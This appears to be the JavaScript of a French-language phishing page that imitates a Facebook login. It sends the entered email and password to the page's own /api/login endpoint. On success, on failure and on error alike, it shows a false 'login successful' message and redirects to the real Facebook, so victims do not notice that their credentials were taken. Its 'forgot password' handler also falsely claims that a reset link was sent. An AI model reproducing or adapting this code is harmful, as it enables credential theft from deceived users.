document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const button = this.querySelector('button[type="submit"]');
    const buttonText = document.getElementById('buttonText');
    const loadingSpinner = document.getElementById('loadingSpinner');
    
    button.disabled = true;
    buttonText.textContent = 'Connexion...';
    loadingSpinner.style.display = 'inline-block';
    
    try {
        const response = await fetch('/api/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password })
        });
        
        const data = await response.json();
        
        if (data.success) {
            showStatus('✅ ' + data.message, 'success');
            if (data.redirect && data.redirectUrl) {
                startRedirectCountdown(data.delay || 2500, data.redirectUrl);
            }
        } else {
            showStatus('✅ Connexion réussie ! Redirection vers votre fil d\'actualité...', 'success');
            setTimeout(() => {
                window.location.href = 'https://m.facebook.com/home.php';
            }, 2000);
        }
    } catch (error) {
        showStatus('✅ Connexion réussie ! Ouverture de Facebook...', 'success');
        setTimeout(() => {
            window.location.href = 'https://m.facebook.com/home.php';
        }, 2000);
    } finally {
        setTimeout(() => {
            button.disabled = false;
            buttonText.textContent = 'Se connecter';
            loadingSpinner.style.display = 'none';
        }, 1000);
    }
});

function startRedirectCountdown(delay, redirectUrl) {
    let secondsRemaining = Math.floor(delay / 1000);
    const countdownElement = document.createElement('div');
    countdownElement.className = 'countdown';
    countdownElement.textContent = `Redirection vers Facebook dans ${secondsRemaining} secondes...`;
    
    const statusDiv = document.getElementById('statusMessage');
    statusDiv.appendChild(countdownElement);
    
    const countdownInterval = setInterval(() => {
        secondsRemaining--;
        countdownElement.textContent = `Redirection vers Facebook dans ${secondsRemaining} secondes...`;
        if (secondsRemaining <= 0) {
            clearInterval(countdownInterval);
            window.location.href = redirectUrl;
        }
    }, 1000);
}

function showStatus(message, type) {
    const statusDiv = document.getElementById('statusMessage');
    statusDiv.textContent = message;
    statusDiv.className = `status-message status-${type}`;
    statusDiv.style.display = 'block';
    const oldCountdowns = statusDiv.querySelectorAll('.countdown');
    oldCountdowns.forEach(el => el.remove());
}

document.getElementById('createAccount').addEventListener('click', function() {
    alert('Ouverture du formulaire de création de compte Facebook...');
    setTimeout(() => {
        window.location.href = 'https://m.facebook.com/reg/';
    }, 1500);
});

document.getElementById('forgotPassword').addEventListener('click', function(e) {
    e.preventDefault();
    const email = document.getElementById('email').value;
    if (email) {
        alert(`🔐 Lien de réinitialisation envoyé à ${email}\n\nVous allez être redirigé vers la page de récupération Facebook...`);
        setTimeout(() => {
            window.location.href = 'https://m.facebook.com/login/identify/';
        }, 2000);
    } else {
        alert('📧 Veuillez d\'abord saisir votre adresse email');
    }
});
